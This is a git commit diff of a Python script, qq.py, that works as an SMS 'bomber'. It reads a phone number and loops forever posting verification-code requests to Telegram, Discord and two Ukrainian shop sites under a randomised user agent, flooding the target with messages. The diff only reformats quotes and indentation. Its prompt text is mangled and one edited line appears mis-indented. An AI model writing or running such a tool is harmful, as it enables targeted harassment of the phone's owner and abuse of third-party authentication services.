2c64fce6a87d6d66d01e27c80ef8192f81f026b9
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 15:41:35 +0200

    Add files via upload

--- qq.py
+++ qq.py
@@ -4,26 +4,25 @@ user = fake_useragent.UserAgent().random
 headers = {'user_agent' : user}
 NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
- 
-while True:
+ while True:
  try:
-     print('Отправлено')
+     print("Отправлено")
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
  except:
-     print('Не доставлено')
+     print("Не доставлено")
  try:
-     print('Отправлено')
+     print("Отправлено")
      response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
  except:
-     print('Не доставлено')
+     print("Не доставлено")
  try:
-     print('Отправлено')
+     print("Отправлено")
      response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
  except:
-     print('Не доставлено')
+     print("Не доставлено")
  try:
-     print('Отправлено')
+     print("Отправлено")
      response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone': "+" + NUMBER})
  except:
-     print('Не доставлено')
+     print("Не доставлено")
 time.sleep(5000)
